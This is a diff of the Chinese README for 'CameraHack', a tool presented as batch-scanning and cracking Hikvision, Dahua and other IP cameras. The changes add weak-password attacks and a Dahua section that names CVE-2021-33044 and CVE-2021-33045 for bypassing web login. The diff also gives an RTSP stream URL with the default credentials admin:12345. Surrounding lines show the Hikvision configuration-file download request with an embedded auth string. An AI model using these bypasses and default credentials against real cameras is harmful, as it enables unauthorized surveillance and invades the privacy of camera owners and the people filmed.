@@ -1,5 +1,5 @@
 # CameraHack
-批量扫描破解海康威视、大华等摄像头的常见漏洞。
+批量扫描破解海康威视、大华等摄像头的常见漏洞、弱密码
 
 ## 海康威视
 
@@ -37,4 +37,11 @@ http://192.168.1.3/System/configurationFile?auth=YWRtaW46MTEK
 - 需要一个工具 `wxMEdit` 打开解密后的配置文件,搜索关键字 `admin`.
 
 ## 大华摄像头
-> 漏洞利用 `CVE-2021-33044` & `CVE-2021-33045` , 绕过 web 登录鉴权
+
+### 漏洞利用 `CVE-2021-33044` & `CVE-2021-33045` , 绕过 web 登录鉴权
+
+### rtsp 弱密码
+```shell
+rtsp://admin:12345@IP:554/cam/realmonitor?channel=1&subtype=0
+```
+
